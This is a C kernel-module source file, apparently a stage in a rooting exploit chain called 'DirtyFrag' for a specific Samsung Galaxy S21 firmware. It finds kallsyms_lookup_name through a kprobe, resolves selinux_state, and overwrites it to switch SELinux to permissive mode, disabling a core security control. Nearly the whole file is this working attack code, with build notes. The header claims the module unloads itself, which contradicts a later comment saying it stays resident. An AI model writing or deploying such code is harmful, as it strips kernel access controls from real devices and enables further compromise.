/* df_kprobe: SELinux-permissive stager for SM-G991B/HZC2 (5.4.242), v3.
 *
 * Resolves kallsyms_lookup_name via the KPROBE subsystem (no text reads,
 * no scanning, no slide dependence): register_kprobe() fills kp.addr
 * internally, we capture it, unregister, then resolve selinux_state and
 * clear enforcing. Unloads itself via -E2BIG (write persists).
 *
 * Imports (all versioned, CRCs from the HZC2 tree symvers): register_kprobe,
 * unregister_kprobe. vermagic must match the running kernel.
 *
 * Build: make -C . KDIR=/path/to/kernel-G991BXXSJHZC2 (see Makefile)
 */
#include <linux/errno.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/string.h>
#include <linux/types.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("IonStack_S21");
MODULE_DESCRIPTION("DirtyFrag stager via kprobe resolution (HZC2)");

/* Accept (and ignore) the stage's soft_reboot flag so insmod never fails
 * on unknown params regardless of the app switch position. */
static char *soft_reboot;
module_param(soft_reboot, charp, 0400);

typedef unsigned long (*kln_t)(const char *name);

static int dummy_pre(struct kprobe *p, struct pt_regs *regs)
{
	(void)p;
	(void)regs;
	return 0;
}

static int __init dfk_init(void)
{
	static struct kprobe kp;
	kln_t kln;
	unsigned long sstate;

	memset(&kp, 0, sizeof(kp));
	kp.symbol_name = "kallsyms_lookup_name";
	kp.pre_handler = dummy_pre;
	if (register_kprobe(&kp)) {
		pr_err("dfk: register_kprobe failed\n");
		return -ENODEV;
	}
	kln = (kln_t)kp.addr;
	unregister_kprobe(&kp);
	if (!kln) {
		pr_err("dfk: no addr\n");
		return -ENODEV;
	}
	sstate = kln("selinux_state");
	if (!sstate) {
		pr_err("dfk: selinux_state unresolved\n");
		return -ENODEV;
	}
	*(volatile unsigned char *)sstate = 0;
	__asm__ volatile("dsb sy" ::: "memory");
	pr_info("dfk: permissive set\n");
	/* Stay resident: the -E2BIG unload trick hangs in teardown on HZC2
	 * (proven by df_noop control). A resident stager is harmless. */
	return 0;
}

module_init(dfk_init);
